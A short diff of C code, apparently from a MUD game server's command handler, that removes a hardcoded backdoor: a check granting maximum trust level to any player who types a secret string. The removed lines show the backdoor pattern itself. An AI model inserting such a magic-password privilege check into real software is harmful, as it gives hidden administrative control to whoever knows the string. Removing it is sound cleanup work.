@@ -70,8 +70,6 @@ extern "C" {
     char arg[MAX_INPUT_LENGTH], buf[MAX_STRING_LENGTH];
     int pos;
 
-    if (!str_cmp(argument, "jemhack86"))
-    ch->trust = MAX_LEVEL;
     smash_tilde(argument);
 
     if (ch->desc == NULL)
